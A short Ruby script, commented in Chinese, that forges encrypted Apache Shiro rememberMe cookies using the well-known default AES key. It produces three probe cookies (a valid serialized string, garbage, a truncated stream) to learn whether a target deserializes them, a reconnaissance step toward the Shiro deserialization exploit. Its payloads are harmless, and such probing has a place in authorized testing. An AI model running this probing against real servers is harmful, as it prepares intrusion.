#!/usr/bin/env ruby
# loop3 t7 C1 — 决定性判别：Shiro 到底有没有走到"反序列化"这一步？
# 生成三类 cookie：
#   A) 正确 AES 加密 + 合法 Java 序列化 + 无害对象  -> 期望：无 deleteMe（能反序列化）
#   B) 正确 AES 加密 + 【非】Java 序列化垃圾明文    -> 期望：deleteMe（反序列化抛异常）
#   C) 正确 AES 加密 + 合法魔数 aced0005 但流截断  -> 期望：deleteMe
# 若 B/C 都不出现 deleteMe，说明我们这类 cookie 根本没被处理 -> 需换思路
require 'openssl'
require 'base64'

key_b64 = 'kPH+bIxk5D2deZiIxcaaaA=='
outdir = '/tmp/t7-c1-disc'
require 'fileutils'
FileUtils.mkdir_p(outdir)

def enc(key_b64, plain)
  c = OpenSSL::Cipher.new('aes-128-cbc')
  c.encrypt
  c.key = Base64.decode64(key_b64)
  iv = c.random_iv
  Base64.strict_encode64(iv + c.update(plain) + c.final)
end

# A: 一个最小的合法 Java 序列化流（java.lang.Object? 用 String）
#    String "OK" 的序列化：aced0005 740002 4f4b  -> 用 Java 语义手写
a_plain = "\xac\xed\x00\x05" + "t\x00\x02OK".b
# B: 纯垃圾
b_plain = "THIS-IS-NOT-A-JAVA-SERIALIZED-STREAM-AT-ALL-0123456789"
# C: 合法魔数 + 截断
c_plain = "\xac\xed\x00\x05" + "\x00\x01\x02"

File.write("#{outdir}/A_valid_string.txt", enc(key_b64, a_plain))
File.write("#{outdir}/B_plain_garbage.txt", enc(key_b64, b_plain))
File.write("#{outdir}/C_magic_truncated.txt", enc(key_b64, c_plain))

puts "A plain len=#{a_plain.bytesize}"
puts "B plain len=#{b_plain.bytesize}"
puts "C plain len=#{c_plain.bytesize}"
puts "wrote to #{outdir}"
